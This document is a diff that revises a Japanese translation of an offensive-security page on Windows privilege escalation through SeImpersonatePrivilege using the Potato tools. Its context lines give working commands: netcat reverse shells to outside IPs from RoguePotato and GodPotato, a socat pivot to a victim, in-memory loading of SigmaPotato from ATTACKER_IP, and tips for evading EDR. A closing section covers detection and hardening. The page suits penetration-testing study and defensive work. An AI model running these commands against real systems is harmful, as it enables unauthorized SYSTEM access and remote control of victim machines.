@@ -22,23 +22,23 @@ from-high-integrity-to-system-with-name-pipes.md
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-## Requirements and common gotchas
+## 要件とよくある落とし穴
 
-All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:
+以下の手法はすべて、以下のいずれかの権限を持つコンテキストから、インパーソネーション（impersonation）が可能な特権サービスを悪用することに依存します:
 
-- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
-- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)
+- SeImpersonatePrivilege（最も一般的）または SeAssignPrimaryTokenPrivilege
+- トークンがすでに SeImpersonatePrivilege を持っている場合（IIS AppPool、MSSQL など多くのサービスアカウントに典型的）、High integrity は不要です。
 
-Check privileges quickly:
+権限を素早く確認:
 ```cmd
 whoami /priv | findstr /i impersonate
 ```
-運用上の注意:
+運用メモ:
 
-- PrintSpoofer は Print Spooler service が起動しており、ローカル RPC エンドポイント (spoolss) 経由で到達可能である必要があります。ハードニングされた環境で post-PrintNightmare により Spooler が無効化されている場合は、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
-- RoguePotato は TCP/135 上で到達可能な OXID resolver を必要とします。egress がブロックされている場合は、redirector/port-forwarder を使用してください（下の例を参照）。古いビルドでは -f フラグが必要でした。
-- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプがブロックされている場合は、代替のパイプ（lsarpc、efsrpc、samr、lsass、netlogon）を試してください。
-- RpcBindingSetAuthInfo 実行中に発生するエラー 0x6d3 は、通常、未知または未サポートの RPC 認証サービスを示します。別のパイプ/トランスポートを試すか、対象のサービスが実行中であることを確認してください。
+- PrintSpoofer は Print Spooler service が稼働しており、ローカル RPC エンドポイント (spoolss) 経由で到達可能である必要があります。PrintNightmare 後に Spooler が無効化されているようなハードニングされた環境では、RoguePotato/GodPotato/DCOMPotato/EfsPotato を優先してください。
+- RoguePotato は TCP/135 上で到達可能な OXID resolver を必要とします。egress がブロックされている場合は redirector/port-forwarder を使用してください（下の例を参照）。古いビルドでは -f フラグが必要でした。
+- EfsPotato/SharpEfsPotato は MS-EFSR を悪用します。あるパイプがブロックされている場合は、代替のパイプ (lsarpc, efsrpc, samr, lsass, netlogon) を試してください。
+- RpcBindingSetAuthInfo 実行中に発生する Error 0x6d3 は、通常、未知またはサポートされていない RPC 認証サービスを示します。別のパイプ/トランスポートを試すか、対象サービスが実行中であることを確認してください。
 
 ## クイックデモ
 
@@ -58,7 +58,7 @@ NULL
 
 ```
 注意:
-- 現在のコンソールでインタラクティブなプロセスを生成するには -i を、ワンライナーを実行するには -c を使用できます。
+- 現在のコンソールでインタラクティブなプロセスを起動するには -i を、ワンライナーを実行するには -c を使用できます。
 - Spooler service が必要です。無効になっていると失敗します。
 
 ### RoguePotato
@@ -67,7 +67,7 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l
 # In some old versions you need to use the "-f" param
 c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
 ```
-アウトバウンドのポート135がブロックされている場合は、redirector上でsocatを使ってOXID resolverをピボットしてください:
+アウトバウンド135がブロックされている場合は、リダイレクタ上でsocat経由でOXID resolverをpivotしてください:
 ```bash
 # On attacker redirector (must listen on TCP/135 and forward to victim:9999)
 socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
@@ -111,7 +111,7 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 
 nt authority\system
 ```
-ヒント: あるパイプが失敗するか EDR によってブロックされた場合は、他のサポートされているパイプを試してください:
+ヒント: ある pipe が失敗するか EDR によってブロックされた場合は、他のサポートされている pipes を試してください:
 ```text
 EfsPotato <cmd> [pipe]
 pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
@@ -122,14 +122,14 @@ pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
 # You can achieve a reverse shell like this.
 > GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-注記:
+Notes:
 - SeImpersonatePrivilege が存在する場合、Windows 8/8.1–11 および Server 2012–2022 で動作します。
 
 ### DCOMPotato
 
 ![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
 
-DCOMPotato は、RPC_C_IMP_LEVEL_IMPERSONATE をデフォルトとするサービスの DCOM オブジェクトをターゲットにした 2 つのバリアントを提供します。提供されたバイナリをビルドするか使用し、コマンドを実行してください:
+DCOMPotato は、デフォルトで RPC_C_IMP_LEVEL_IMPERSONATE を使用するサービスの DCOM オブジェクトを標的とする 2 種類のバリアントを提供します。提供された binaries をビルドするか使用して、コマンドを実行してください:
 ```cmd
 # PrinterNotify variant
 PrinterNotifyPotato.exe "cmd /c whoami"
@@ -137,9 +137,9 @@ PrinterNotifyPotato.exe "cmd /c whoami"
 # McpManagementService variant (Server 2022 also)
 McpManagementPotato.exe "cmd /c whoami"
 ```
-### SigmaPotato (更新された GodPotato のフォーク)
+### SigmaPotato (更新された GodPotato フォーク)
 
-SigmaPotato は .NET reflection を使ったインメモリ実行や PowerShell reverse shell helper のようなモダンな便利機能を追加します。
+SigmaPotato は .NET reflection を介した in-memory execution や PowerShell reverse shell helper といったモダンな便利機能を追加します。
 ```powershell
 # Load and execute from memory (no disk touch)
 [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
@@ -150,13 +150,13 @@ SigmaPotato は .NET reflection を使ったインメモリ実行や PowerShell 
 ```
 ## 検出とハードニングの注意点
 
-- プロセスが名前付きパイプを作成し、直後にトークン複製用APIを呼び出してから CreateProcessAsUser/CreateProcessWithTokenW を実行する動きを監視する。Sysmon は有用なテレメトリを示せる: Event ID 1 (process creation)、17/18 (named pipe created/connected)、および SYSTEM として子プロセスを生成するコマンドライン。
-- Spooler のハードニング: 不要なサーバーで Print Spooler サービスを無効化すると、spoolss 経由の PrintSpoofer 型のローカル悪用を防止できる。
-- サービスアカウントのハードニング: カスタムサービスに SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege を割り当てるのは最小限にする。可能であれば必要最小権限の仮想アカウントでサービスを実行し、service SID や書き込み制限されたトークンで隔離することを検討する。
-- ネットワーク制御: アウトバウンド TCP/135 をブロックするか RPC endpoint mapper トラフィックを制限することで、内部リダイレクタが利用できない限り RoguePotato を阻止できる。
-- EDR/AV: これらのツールは広くシグネチャ化されている。ソースから再コンパイルしたりシンボル/文字列をリネームしたりインメモリ実行を使うことで検出を減らせるが、堅牢な振る舞い検出を完全に回避することはできない。
+- Monitor for processes creating named pipes and immediately calling token-duplication APIs followed by CreateProcessAsUser/CreateProcessWithTokenW. Sysmon can surface useful telemetry: Event ID 1 (process creation), 17/18 (named pipe created/connected), and command lines spawning child processes as SYSTEM.
+- Spooler hardening: Disabling the Print Spooler service on servers where it isn’t needed prevents PrintSpoofer-style local coercions via spoolss.
+- Service account hardening: カスタムサービスへの SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege の割当は最小限にする。可能であれば、必要最小権限の仮想アカウントでサービスを実行し、service SID や書き込み制限付きトークンで分離することを検討する。
+- Network controls: outbound TCP/135 をブロックするか RPC endpoint mapper トラフィックを制限すると、内部リダイレクタがない限り RoguePotato を破綻させる可能性がある。
+- EDR/AV: これらのツールは広くシグネチャ化されている。recompiling from source、シンボル/文字列のリネーム、または in-memory execution を用いることで検出を低減できるが、堅牢な振る舞いベースの検出を回避することはできない。
 
-## 参考
+## References
 
 - [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
 - [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
